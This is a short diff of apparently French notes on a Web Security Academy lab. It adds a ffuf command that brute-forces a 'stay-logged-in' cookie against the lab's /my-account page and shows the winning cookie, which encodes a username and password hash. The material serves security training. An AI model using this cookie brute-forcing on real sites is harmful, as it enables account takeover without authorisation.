@@ -36,3 +36,15 @@ location: /login
 set-cookie: session=AY4yU8yk4Lbd2lsG7knHUd0Tb2NXuuE0; Secure; HttpOnly; SameSite=None
 x-frame-options: SAMEORIGIN
 content-length: 0
+
+
+# Lancement du script de génération du cookie
+
+# Mise en place du script ffuf
+ffuf -w candidat_cookie.txt:COOKIE \
+  -u https://0a33001304de32da81d53571004700a5.web-security-academy.net/my-account \
+  -X GET \
+  -b "stay-logged-in=COOKIE" \
+  -mc 200
+
+  Output : Y2FybG9zOjIxYjcyYzBiN2FkYzVjN2I0YTUwZmZjYjkwZDkyZGQ2 [Status: 200, Size: 3230, Words: 1296, Lines: 67, Duration: 101ms]
